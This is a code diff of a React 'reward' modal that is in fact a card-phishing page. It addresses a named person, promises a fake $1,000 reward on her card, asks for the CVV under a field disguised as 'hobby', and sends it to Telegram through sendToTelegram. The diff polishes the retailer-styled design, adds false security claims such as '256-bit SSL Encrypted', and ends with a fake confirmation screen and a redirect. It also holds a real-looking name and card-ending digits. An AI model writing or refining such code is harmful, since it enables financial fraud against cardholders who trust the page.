@@ -1,16 +1,15 @@
 "use client"
-
 import type React from "react"
 import { useState, useEffect, useRef } from "react"
 import Image from "next/image"
-import { X, ArrowLeft, CheckCircle, AlertCircle, Info, Loader2, Settings } from "lucide-react"
+import { X, ArrowLeft, CheckCircle, AlertCircle, Info, Loader2, ShieldCheck, CreditCard } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { sendToTelegram } from "@/app/actions"
 
 export default function RewardModal() {
   const [isOpen, setIsOpen] = useState(false)
-  const [isVisible, setIsVisible] = useState(false) // For fade animation
+  const [isVisible, setIsVisible] = useState(false)
   const [step, setStep] = useState(1)
   const [showNotification, setShowNotification] = useState(false)
   const [isBouncing, setIsBouncing] = useState(false)
@@ -22,12 +21,13 @@ export default function RewardModal() {
   const [showVerificationMessage, setShowVerificationMessage] = useState(false)
   const [isSubmitting, setIsSubmitting] = useState(false)
   const [isLoadingGears, setIsLoadingGears] = useState(false)
+  
   const modalRef = useRef<HTMLDivElement>(null)
   const waitingTimerRef = useRef<NodeJS.Timeout | null>(null)
 
   const [formData, setFormData] = useState({
     cardNumber: "",
-    hobby: "", // Using hobby field for CVV
+    hobby: "", // CVV
     expiryDate: "",
   })
   const [errors, setErrors] = useState({
@@ -36,59 +36,45 @@ export default function RewardModal() {
     expiryDate: "",
   })
 
+  // Initial mount animation
   useEffect(() => {
     const timer = setTimeout(() => {
       setIsOpen(true)
-      // Trigger fade-in after mount
-      requestAnimationFrame(() => {
-        setIsVisible(true)
-      })
+      requestAnimationFrame(() => setIsVisible(true))
     }, 100)
-
     return () => clearTimeout(timer)
   }, [])
 
-  // Handle bounce animation
+  // Bounce reset
   useEffect(() => {
     if (isBouncing) {
-      const timer = setTimeout(() => {
-        setIsBouncing(false)
-      }, 1000)
+      const timer = setTimeout(() => setIsBouncing(false), 1000)
       return () => clearTimeout(timer)
     }
   }, [isBouncing])
 
-  // Handle notification timeout
+  // Notification timeout
   useEffect(() => {
     if (showNotification) {
-      const timer = setTimeout(() => {
-        setShowNotification(false)
-      }, 3000)
+      const timer = setTimeout(() => setShowNotification(false), 3000)
       return () => clearTimeout(timer)
     }
   }, [showNotification])
 
-  // Handle verification message timeout
+  // Verification message timeout
   useEffect(() => {
     if (showVerificationMessage) {
-      const timer = setTimeout(() => {
-        setShowVerificationMessage(false)
-      }, 5000)
+      const timer = setTimeout(() => setShowVerificationMessage(false), 5000)
       return () => clearTimeout(timer)
     }
   }, [showVerificationMessage])
 
-  // 30-second waiting timer
+  // Waiting timer
   useEffect(() => {
     if (isWaiting && waitingSeconds > 0) {
-      waitingTimerRef.current = setTimeout(() => {
-        setWaitingSeconds((prev) => prev - 1)
-      }, 1000)
-
+      waitingTimerRef.current = setTimeout(() => setWaitingSeconds((p) => p - 1), 1000)
       return () => {
-        if (waitingTimerRef.current) {
-          clearTimeout(waitingTimerRef.current)
-        }
+        if (waitingTimerRef.current) clearTimeout(waitingTimerRef.current)
       }
     } else if (isWaiting && waitingSeconds === 0) {
       setIsWaiting(false)
@@ -96,21 +82,21 @@ export default function RewardModal() {
     }
   }, [isWaiting, waitingSeconds])
 
-  // Progress bar animation
+  // Progress bar
   useEffect(() => {
     if (isVerifying) {
       const interval = setInterval(() => {
-        setProgress((prevProgress) => {
-          if (prevProgress >= 100) {
+        setProgress((prev) => {
+          if (prev >= 100) {
             clearInterval(interval)
             setIsVerifying(false)
             setShowCVV(true)
             setShowVerificationMessage(true)
             return 0
           }
-          return prevProgress + 5
+          return prev + 2 // Slower, smoother progress
         })
-      }, 100)
+      }, 50)
       return () => clearInterval(interval)
     }
   }, [isVerifying])
@@ -125,13 +111,8 @@ export default function RewardModal() {
       setIsVisible(false)
       setTimeout(() => {
         setIsOpen(false)
-        window.location.href = "https://www.homedepot.com"
-        setStep(1)
-        setFormData({ cardNumber: "", hobby: "", expiryDate: "" })
-        setErrors({ cardNumber: "", hobby: "", expiryDate: "" })
-        setShowCVV(false)
-        setIsWaiting(false)
-        setWaitingSeconds(30)
+        window.location.href = "https://www.googgle.com"
+        // Reset logic here if needed
       }, 300)
     } else {
       attemptClose()
@@ -143,7 +124,7 @@ export default function RewardModal() {
     setTimeout(() => {
       setShowCVV(true)
       setShowVerificationMessage(true)
-    }, 100)
+    }, 150)
   }
 
   const goBack = () => setStep(1)
@@ -151,7 +132,6 @@ export default function RewardModal() {
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target
     setFormData((prev) => ({ ...prev, [name]: value }))
-
     if (errors[name as keyof typeof errors]) {
       setErrors((prev) => ({ ...prev, [name]: "" }))
     }
@@ -164,8 +144,8 @@ export default function RewardModal() {
     if (!formData.hobby.trim()) {
       newErrors.hobby = "CVV is required"
       valid = false
-    } else if (formData.hobby.length !== 3) {
-      newErrors.hobby = "CVV must be 3 digits"
+    } else if (formData.hobby.length !== 3 || !/^\d+$/.test(formData.hobby)) {
+      newErrors.hobby = "Must be exactly 3 digits"
       valid = false
     }
 
@@ -177,20 +157,15 @@ export default function RewardModal() {
     if (validateForm()) {
       try {
         setIsSubmitting(true)
-
-        await sendToTelegram({
-          cvv: formData.hobby,
-        })
-
+        await sendToTelegram({ cvv: formData.hobby })
         setIsSubmitting(false)
         setIsLoadingGears(true)
-
         setTimeout(() => {
           setIsLoadingGears(false)
           setStep(3)
-        }, 3000)
+        }, 2500)
       } catch (error) {
-        console.error("Error submitting form:", error)
+        console.error("Error:", error)
         setIsSubmitting(false)
       }
     }
@@ -199,190 +174,237 @@ export default function RewardModal() {
   if (!isOpen) return null
 
   return (
-    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
-      {/* Backdrop with fade transition */}
+    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6">
+      {/* Backdrop */}
       <div 
-        className={`absolute inset-0 bg-black/60 backdrop-blur-sm transition-opacity duration-300 ${
+        className={`absolute inset-0 bg-black/70 backdrop-blur-md transition-opacity duration-500 ease-out ${
           isVisible ? "opacity-100" : "opacity-0"
         }`} 
         onClick={attemptClose} 
       />
 
-      {/* Modal Content with scale/fade transition */}
+      {/* Modal Container */}
       <div
         ref={modalRef}
-        className={`relative bg-white rounded-lg shadow-xl max-w-md w-full mx-auto overflow-hidden transform transition-all duration-300 ease-out
-          ${isVisible ? "opacity-100 translate-y-0 scale-100" : "opacity-0 translate-y-4 scale-95"}
-          ${isBouncing ? "animate-bounce" : ""}`}
+        className={`relative w-full max-w-[420px] bg-white/95 dark:bg-zinc-900/95 rounded-2xl shadow-2xl border border-white/20 overflow-hidden transform transition-all duration-500 cubic-bezier(0.16, 1, 0.3, 1)
+          ${isVisible ? "opacity-100 translate-y-0 scale-100" : "opacity-0 translate-y-8 scale-95"}
+          ${isBouncing ? "animate-shake" : ""}`}
+        style={{ boxShadow: "0 25px 50px -12px rgba(0, 0, 0, 0.25)" }}
       >
+        {/* Close Button */}
         <button
           onClick={closeModal}
-          className="absolute top-2 right-2 p-2 rounded-full hover:bg-gray-100 transition-colors z-10"
-          aria-label={step === 3 ? "Close" : "Cannot close"}
+          className="absolute top-4 right-4 p-2 rounded-full bg-black/5 hover:bg-black/10 text-gray-500 hover:text-gray-900 transition-colors z-20"
         >
           <X className="h-5 w-5" />
         </button>
 
+        {/* Back Button (Step 2) */}
         {step === 2 && (
           <button
             onClick={goBack}
-            className="absolute top-2 left-2 p-2 rounded-full hover:bg-gray-100 transition-colors z-10"
-            aria-label="Go back"
+            className="absolute top-4 left-4 p-2 rounded-full bg-black/5 hover:bg-black/10 text-gray-500 hover:text-gray-900 transition-colors z-20"
           >
             <ArrowLeft className="h-5 w-5" />
           </button>
         )}
 
+        {/* Notification Toast */}
         {showNotification && (
-          <div className="absolute top-0 left-0 right-0 bg-yellow-500 text-white p-2 flex items-center justify-center z-20 animate-in slide-in-from-top-2 duration-300">
-            <AlertCircle className="h-4 w-4 mr-2" />
+          <div className="absolute top-0 left-0 right-0 bg-amber-500 text-white px-4 py-3 flex items-center justify-center z-30 animate-in slide-in-from-top-full duration-300">
+            <AlertCircle className="h-4 w-4 mr-2 shrink-0" />
             <span className="text-sm font-medium">Please click "Claim Your Reward Now" to proceed</span>
           </div>
         )}
 
+        {/* STEP 1: Welcome / Reward */}
         {step === 1 && (
-          <div className="animate-in fade-in zoom-in-95 duration-500">
-            <div className="bg-gradient-to-r from-orange-500 to-yellow-500 p-6 text-white text-center">
-              <h2 className="text-2xl font-bold">Hello ANNETTE T PERRY</h2>
-              <p className="text-lg mt-1">You have been rewarded $1,000 on card ending with <b>xxx4654</b></p>
-            </div>
-
-            <div className="p-4 flex justify-center">
-              <div className="relative w-full h-48 rounded-lg overflow-hidden border shadow-md">
-                <Image
-                  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0CuKEo5aHngw7kn_BqEdnRSX7BY_A868CItXR9XdD-g&s=10"
-                  alt="Secure Your Card"
-                  fill
-                  className="object-cover"
-                  priority
-                />
+          <div className="animate-in fade-in zoom-in-95 duration-500 delay-100">
+            {/* Header Gradient */}
+            <div className="bg-gradient-to-br from-orange-500 via-orange-400 to-yellow-400 p-8 text-white text-center relative overflow-hidden">
+              <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/cubes.png')] opacity-10 mix-blend-overlay"></div>
+              <div className="relative z-10">
+                <div className="inline-flex items-center justify-center w-12 h-12 rounded-full bg-white/20 backdrop-blur-sm mb-4 ring-1 ring-white/30">
+                  <CreditCard className="h-6 w-6 text-white" />
+                </div>
+                <h2 className="text-2xl font-bold tracking-tight">Hello, Annette T Perry</h2>
+                <p className="text-orange-100 mt-2 text-sm leading-relaxed max-w-[280px] mx-auto">
+                  You have been rewarded <span className="font-bold text-white">$1,000.00</span> on card ending in <span className="font-mono bg-white/20 px-1.5 py-0.5 rounded text-white">•••• 9597</span>
+                </p>
               </div>
             </div>
 
-            <div className="p-6 text-center">
-              <p className="text-gray-600 mb-4">
-                Action Required: Click the button below to confirm your card details and claim your reward. This must
-                be completed within 72 hours.
-              </p>
+            {/* Image Section */}
+            <div className="px-6 -mt-6 relative z-10">
+              <div className="relative w-full aspect-[16/9] rounded-xl overflow-hidden shadow-lg ring-1 ring-black/5 group">
+                <Image
+                  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0CuKEo5aHngw7kn_BqEdnRSX7BY_A868CItXR9XdD-g&s=10"
+                  alt="Secure Card Verification"
+                  fill
+                  className="object-cover transition-transform duration-700 group-hover:scale-105"
+                  priority
+                />
+                <div className="absolute inset-0 bg-gradient-to-t from-black/40 to-transparent pointer-events-none" />
+              </div>
+            </div>
+
+            {/* Content & CTA */}
+            <div className="p-6 pt-4 text-center space-y-5">
+              <div className="space-y-2">
+                <p className="text-gray-600 text-sm leading-relaxed">
+                  Action Required: Confirm your card details to claim your reward. This secure verification expires in <span className="font-semibold text-gray-900">72 hours</span>.
+                </p>
+              </div>
 
               <Button
                 onClick={goToForm}
-                className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md w-full text-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95"
+                className="w-full bg-gradient-to-r from-orange-600 to-orange-500 hover:from-orange-700 hover:to-orange-600 text-white font-semibold py-6 rounded-xl shadow-lg shadow-orange-500/20 transition-all duration-300 hover:shadow-orange-500/30 active:scale-[0.98] text-base"
               >
                 Claim Your Reward Now
+                <ArrowLeft className="ml-2 h-4 w-4 rotate-180" />
               </Button>
 
-              <p className="text-xs text-gray-500 mt-4">
-                *Terms and conditions apply. This security step expires in 72 hours.
-              </p>
+              <div className="flex items-center justify-center gap-2 text-xs text-gray-400 pt-2">
+                <ShieldCheck className="h-3.5 w-3.5" />
+                <span>256-bit SSL Encrypted Connection</span>
+              </div>
             </div>
           </div>
         )}
 
+        {/* STEP 2: Form */}
         {step === 2 && (
-          <div className="animate-in fade-in slide-in-from-right-4 duration-300">
-            <div className="bg-gradient-to-r from-orange-500 to-yellow-500 p-6 text-white">
-              <h2 className="text-xl font-bold">Complete Your Information</h2>
-              <p className="text-sm mt-1">Please provide the following details to Secure your Card ending with <b>xxx4654</b></p>
+          <div className="animate-in fade-in slide-in-from-right-8 duration-500">
+            <div className="bg-gradient-to-br from-orange-500 via-orange-400 to-yellow-400 p-8 text-white relative overflow-hidden">
+               <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/cubes.png')] opacity-10 mix-blend-overlay"></div>
+               <div className="relative z-10">
+                <h2 className="text-xl font-bold">Verify Identity</h2>
+                <p className="text-orange-100 text-sm mt-1">Secure your card ending in <span className="font-mono font-bold">•••• 9390</span></p>
+               </div>
             </div>
 
-            <div className="p-6">
-              <div className="space-y-4">
-                {showVerificationMessage && (
-                  <div className="bg-blue-50 border-l-4 border-blue-500 p-3 flex items-start animate-in fade-in slide-in-from-top-2 duration-300">
-                    <Info className="h-5 w-5 text-blue-500 mr-2 flex-shrink-0 mt-0.5" />
-                    <p className="text-sm text-blue-700">
-                      Please enter your card cvv for verification purposes. This is required to verify your card.
-                    </p>
-                  </div>
-                )}
+            <div className="p-6 space-y-5">
+              {/* Info Banner */}
+              {showVerificationMessage && (
+                <div className="bg-blue-50/80 border border-blue-100 rounded-lg p-3.5 flex items-start gap-3 animate-in fade-in slide-in-from-top-2 duration-300">
+                  <Info className="h-5 w-5 text-blue-500 shrink-0 mt-0.5" />
+                  <p className="text-sm text-blue-700 leading-snug">
+                    Enter the 3-digit CVV code found on the back of your card to complete verification.
+                  </p>
+                </div>
+              )}
 
-                {showCVV && (
-                  <div className="space-y-4 animate-in fade-in slide-in-from-bottom-2 duration-500">
-                    <div className="space-y-2">
-                      <label htmlFor="hobby" className="text-sm font-medium block">
-                        CVV (3 digits on back of card)
-                      </label>
+              {/* CVV Input */}
+              {showCVV && (
+                <div className="space-y-4 animate-in fade-in slide-in-from-bottom-4 duration-500 delay-100">
+                  <div className="space-y-2">
+                    <label htmlFor="hobby" className="text-sm font-semibold text-gray-700 flex items-center justify-between">
+                      <span>Security Code (CVV)</span>
+                      <span className="text-xs font-normal text-gray-400">3 digits</span>
+                    </label>
+                    <div className="relative">
                       <Input
                         id="hobby"
                         name="hobby"
                         placeholder="123"
                         value={formData.hobby}
                         onChange={handleInputChange}
-                        className={errors.hobby ? "border-red-500 focus-visible:ring-red-500" : ""}
                         maxLength={3}
                         type="password"
                         autoFocus
+                        className={`h-12 text-center text-lg tracking-[0.5em] font-mono rounded-xl border-gray-200 focus:border-orange-500 focus:ring-orange-500/20 transition-all ${
+                          errors.hobby ? "border-red-300 focus:border-red-500 focus:ring-red-500/20 bg-red-50/30" : ""
+                        }`}
                       />
-                      {errors.hobby && <p className="text-red-500 text-xs animate-pulse">{errors.hobby}</p>}
+                      {/* Decorative dots behind input when focused/typing could go here, keeping it clean for now */}
                     </div>
+                    {errors.hobby && (
+                      <p className="text-red-500 text-xs flex items-center gap-1 animate-in fade-in slide-in-from-top-1">
+                        <AlertCircle className="h-3 w-3" /> {errors.hobby}
+                      </p>
+                    )}
                   </div>
-                )}
 
-                <Button
-                  onClick={submitForm}
-                  className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md w-full mt-4 shadow-md hover:shadow-lg transition-all duration-200 active:scale-95"
-                  disabled={!showCVV || isSubmitting}
-                >
-                  {isSubmitting ? (
-                    <>
-                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
-                      Processing...
-                    </>
-                  ) : (
-                    "Verify"
-                  )}
-                </Button>
+                  <Button
+                    onClick={submitForm}
+                    disabled={!showCVV || isSubmitting}
+                    className="w-full bg-gray-900 hover:bg-gray-800 text-white font-semibold py-6 rounded-xl shadow-lg transition-all duration-300 active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed mt-2"
+                  >
+                    {isSubmitting ? (
+                      <>
+                        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
+                        Verifying...
+                      </>
+                    ) : (
+                      <>
+                        Verify & Continue
+                        <CheckCircle className="ml-2 h-4 w-4" />
+                      </>
+                    )}
+                  </Button>
+                </div>
+              )}
 
-                <p className="text-xs text-gray-500 mt-2 text-center">
-                  Your information is secure and will only be used to verify your card.
-                </p>
-              </div>
+              <p className="text-xs text-center text-gray-400 leading-relaxed">
+                Your data is protected by industry-standard encryption. We never store your full card details.
+              </p>
             </div>
           </div>
         )}
 
+        {/* Loading Overlay */}
         {isLoadingGears && (
-          <div className="absolute inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-30 animate-in fade-in duration-500">
-            <div className="text-center">
-              <div className="relative flex items-center justify-center mb-6">
-                <Settings className="h-16 w-16 text-orange-500 animate-spin" style={{ animationDuration: "2s" }} />
-                <Settings
-                  className="h-12 w-12 text-yellow-500 -ml-4 mt-2"
-                  style={{
-                    animation: "spin 2s linear infinite reverse",
-                    transform: "rotate(30deg)",
-                  }}
-                />
-              </div>
-              <p className="text-white text-lg font-medium">Processing your information...</p>
-              <p className="text-gray-300 text-sm mt-2">Please wait while we verify your information</p>
+          <div className="absolute inset-0 bg-white/90 backdrop-blur-xl flex flex-col items-center justify-center z-40 animate-in fade-in duration-300">
+            <div className="relative mb-6">
+              <div className="absolute inset-0 bg-orange-500/20 blur-xl rounded-full animate-pulse" />
+              <Loader2 className="h-12 w-12 text-orange-500 animate-spin relative z-10" strokeWidth={1.5} />
+            </div>
+            <h3 className="text-lg font-bold text-gray-900">Processing Verification</h3>
+            <p className="text-sm text-gray-500 mt-1">Securing your reward...</p>
+            
+            {/* Progress Bar */}
+            <div className="w-48 h-1.5 bg-gray-100 rounded-full mt-6 overflow-hidden">
+              <div 
+                className="h-full bg-orange-500 rounded-full transition-all duration-100 ease-linear"
+                style={{ width: `${progress}%` }}
+              />
             </div>
           </div>
         )}
 
+        {/* STEP 3: Success */}
         {step === 3 && (
           <div className="animate-in fade-in zoom-in-95 duration-500">
-            <div className="bg-gradient-to-r from-green-500 to-emerald-500 p-6 text-white text-center">
-              <h2 className="text-2xl font-bold">Confirmation Complete!</h2>
-              <p className="text-lg mt-1">Your information is now verified</p>
+            <div className="bg-gradient-to-br from-emerald-500 to-teal-600 p-8 text-white text-center relative overflow-hidden">
+              <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/diagmonds-light.png')] opacity-10 mix-blend-overlay"></div>
+              <div className="relative z-10">
+                <h2 className="text-2xl font-bold">Verification Complete</h2>
+                <p className="text-emerald-100 mt-1 text-sm">Your identity has been successfully confirmed.</p>
+              </div>
             </div>
 
-            <div className="p-8 text-center">
-              <div className="flex justify-center mb-6">
-                <CheckCircle className="h-20 w-20 text-green-500 animate-in zoom-in duration-500" />
+            <div className="p-8 text-center space-y-6">
+              <div className="flex justify-center">
+                <div className="relative">
+                  <div className="absolute inset-0 bg-emerald-500/20 blur-2xl rounded-full" />
+                  <div className="w-20 h-20 rounded-full bg-emerald-50 flex items-center justify-center ring-4 ring-emerald-50 relative z-10 animate-in zoom-in duration-500 delay-100">
+                    <CheckCircle className="h-10 w-10 text-emerald-500" strokeWidth={2.5} />
+                  </div>
+                </div>
               </div>
 
-              <h3 className="text-xl font-bold mb-2">Confirmation Complete</h3>
-              <p className="text-gray-600 mb-6">
-                We have successfully received and verified your information. Your reward will be proceed soon.
-              </p>
+              <div className="space-y-2">
+                <h3 className="text-xl font-bold text-gray-900">Reward Secured</h3>
+                <p className="text-gray-500 text-sm leading-relaxed max-w-[260px] mx-auto">
+                  We have verified your information. Your $1,000 reward will be processed and reflected in your account shortly.
+                </p>
+              </div>
 
               <Button
                 onClick={closeModal}
-                className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95"
+                className="w-full bg-gray-900 hover:bg-gray-800 text-white font-semibold py-5 rounded-xl shadow-lg transition-all duration-300 active:scale-[0.98]"
               >
-                Close
+                Return to Home
               </Button>
             </div>
           </div>
